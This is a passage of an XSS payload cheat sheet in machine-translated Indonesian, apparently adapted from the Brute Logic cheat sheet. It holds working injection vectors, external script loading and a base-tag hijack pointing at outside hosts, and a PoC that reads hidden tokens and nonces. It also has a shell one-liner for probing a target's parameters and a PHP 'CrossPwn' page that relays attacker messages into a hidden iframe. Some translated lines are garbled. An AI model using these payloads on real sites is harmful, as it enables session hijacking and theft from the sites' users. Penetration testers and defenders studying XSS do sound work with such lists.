Gunakan untuk mencegah XSS dalam setiap konteks selama input tidak mencerminkan non-delimited

string, di tengah-tengah backticks atau fungsi lain seperti eval (semua yang ada dalam konteks JS). Itu

tidak mencegah terhadap XSS berbasis DOM, hanya kasus XSS berbasis sumber.

       $input = preg_replace("/:|\\\\\\/", "", htmlentities($input, ENT_QUOTES))

> JavaScript Execution Delay

Gunakan saat pustaka javascript atau sumber daya lain yang diperlukan untuk injeksi tidak dimuat sepenuhnya

dalam pelaksanaan payload. Contoh panggilan eksternal berbasis JQuery.

       onload=function(){$.getScript('//brutelogic.com.br/2.js')}
    
       onload=x=>$.getScript('//brutelogic.com.br/2.js')

> Valid Source for Image Tags

Gunakan saat diperlukan atribut src yang valid untuk memicu peristiwa yang dimuat alih-alih satu kesalahan.

       <img src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=onload=alert(1)>

> Shortest XSS

Gunakan ketika Anda memiliki slot terbatas untuk injeksi. Membutuhkan naskah asli (ada dalam sumber

kode sudah) dipanggil dengan jalur relatif ditempatkan setelah tempat injeksi. Server penyerang

harus membalas dengan skrip serang ke permintaan persis yang dilakukan oleh skrip asli (jalur yang sama) atau

dalam halaman 404 default (lebih mudah). Domain yang lebih pendek, semakin baik.

       <base href=//knoxss.me>

> Mobile-only Event Handlers

Gunakan saat menargetkan aplikasi seluler.

       <html ontouchstart=alert(1)>
    
       <html ontouchend=alert(1)>
    
       <html ontouchmove=alert(1)>
    
       <body onorientationchange=alert(1)>

> Body Tag

Kumpulan vektor tubuh. Yang terakhir hanya berfungsi untuk browser Microsoft.

       <body onload=alert(1)>
    
       <body onpageshow=alert(1)>
    
       <body onfocus=alert(1)>
    
       <body onhashchange=alert(1)><a href=%23x>click this!#x
    
       <body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
    
       <body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br>
    
       <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
    
       <br><x id=x>#x
    
       <body onresize=alert(1)>press F12!
    
       <body onhelp=alert(1)>press F1!

> Less Known XSS Vectors

Kumpulan vektor XSS yang kurang dikenal.

       <marquee onstart=alert(1)>
    
       <marquee loop=1 width=0 onfinish=alert(1)>
    
       <audio src onloadstart=alert(1)>
    
       <video onloadstart=alert(1)><source>
    
       <input autofocus onblur=alert(1)>
    
       <keygen autofocus onfocus=alert(1)>
    
       <form onsubmit=alert(1)><input type=submit>
    
       <select onchange=alert(1)><option>1<option>2
    
       <menu id=x contextmenu=x onshow=alert(1)>right click me!
    
       <object onerror=alert(1)>

> Alternative PoC - Shake Your Body

Gunakan untuk mengguncang semua elemen halaman sebagai visualisasi kerentanan yang baik.

       setInterval(x=>{b=document.body.style,b.marginTop=(b.marginTop=='4px')?'-4px':'4px';},5)

> Alternative PoC - Brutality

Gunakan untuk menampilkan gambar karakter Sub-Zero Mortal Kombat bersama dengan "kebrutalan"

suara game.

       d=document,i=d.createElement('img');i.src='//brutelogic.com.br/brutality.jpg';
    
       d.body.insertBefore(i,d.body.firstChild);new(Audio)('//brutelogic.com.br/brutality.mp3').play();

> Alternative PoC - Alert Hidden Values

Gunakan untuk membuktikan bahwa semua nilai HTML tersembunyi seperti token dan nonces di halaman target dapat dicuri.

       f=document.forms;for(i=0;i<f.length;i++){e=f\[i\].elements;for(n in e){if(e\[n\].type=='hidden')
    
       {alert(e\[n\].name+': '+e\[n\].value)}}}

> Improved Likelihood of Mouse Events

Gunakan untuk membuat area yang lebih besar untuk memicu aktivitas mouse. Tambahkan yang berikut ini (sebagai atribut)

di dalam vektor XSS apa pun yang menggunakan acara mouse seperti onmouseover, onclick, dll.

       style=position:fixed;top:0;left:0;font-size:999px

> Alternative to Style Tag

Gunakan saat kata kunci "style" diblokir untuk inline dan nama tag. Berikan HOST dan FILE

untuk CSS atau hanya CSS saja dalam vektor kedua.

       <link rel=stylesheet href=//HOST/FILE>
    
       <link rel=stylesheet href=data:text/css,CSS>

> Simple Google Scraper

Gunakan untuk mengikis hasil Google untuk QUERY yang diberikan, yang harus disediakan di terminal

skrip di bawah ini. Ini adalah baris perintah dan "$" adalah terminal prompt.

       $ q="QUERY"; wget -U "Opera/4" "[https://google.com/search?num=100&q=](https://google.com/search?num=100&q= "https://google.com/search?num=100&q=")$q" -qO- | sed "s/+$q/ /g" | egrep -o ":.{12}:https?://\\S*\\??\\S*" | sed "s/.*:h/h/

> Simple XSS Guesser

Gunakan untuk menemukan kelemahan XSS dengan menggunakan parameter yang tidak jelas. Cukup sediakan TARGET, sebuah XSS

probe (seperti <x) dan PARAMLIST, file dengan parameter 1 halaman per baris (seperti id, cod, q, query

dll) dalam skrip terminal di bawah ini. Ini adalah baris perintah dan "$" adalah terminal prompt.

       $ t="TARGET/"; x="XSS"; q=?; while read p; do q="$q&$p=$x"; done < PARAMLIST; wget -qO- $t$q | grep $x && echo "$t !"

> Cross-Origin Script (Crosspwn)

Simpan konten di bawah ini sebagai file .php dan gunakan sebagai berikut:

http: //localhost/crosspwn.php? target = // hacker.com.br/tests/

status.html & msg = peringatan <script> (document.domain)

Di mana "facebook.com" adalah asal yang diizinkan dan "localhost" sedang menyerang domain,

"//hacker.com.br/tests/status.html" adalah halaman target dan "peringatan <script> (document.domain)"

dikirim pesan.

Penggunaan lain adalah untuk menembak penangan event body onresize dan onhash tanpa pengguna

interaksi:

http: //localhost/crosspwn.php? target = // hacker.com.br/xss.php? a = <body /

onresize = lansiran (document.domain)>

Dan untuk mempersingkat dan menyembunyikan muatan yang disuntikkan, bidang tambahan "nama" dapat digunakan.

http: //localhost/crosspwn.php? target = // hacker.com.br/xss.php? a = <svg /

onload = eval (name)> & name = alert (document.domain)

=> Code:

      <!DOCTYPE html>
    
      <body onload="crossPwn()">
    
       <h2>CrossPwn</h2>
    
       <iframe src="<?=htmlentities($_GET\['target'\], ENT_QUOTES) ?>" name="<?=
    
       $_GET\['name'\] ?>" height="0" style="visibility:hidden"></iframe>
    
       <script>
    
       function crossPwn() {
    
       frames\[0\].postMessage('<?php echo $_GET\["msg"\] ?>','*'); // onmessage
    
       document.getElementsByTagName('iframe')\[0\].setAttribute('height', '1'); // onresize
    
       document.getElementsByTagName('iframe')\[0\].src = '<?=$_GET\["target"\] ?>' + '#brute'; //
    
       onhashchange
    
       }
    
       </script>
    
       </body>
    
       </html>

\# Payload Xss

[https://github.com/3xploit-db/XSS-Payloads/blob/master/payload.txt](https://github.com/3xploit-db/XSS-Payloads/blob/master/payload.txt "https://github.com/3xploit-db/XSS-Payloads/blob/master/payload.txt")

\# ASCII Encoding Table

<h4 align="center"><img src="![](https://raw.githubusercontent.com/3xploit-db/xss-cheat-sheet/master/ascii.png)" width="500px" height="500px"></h4>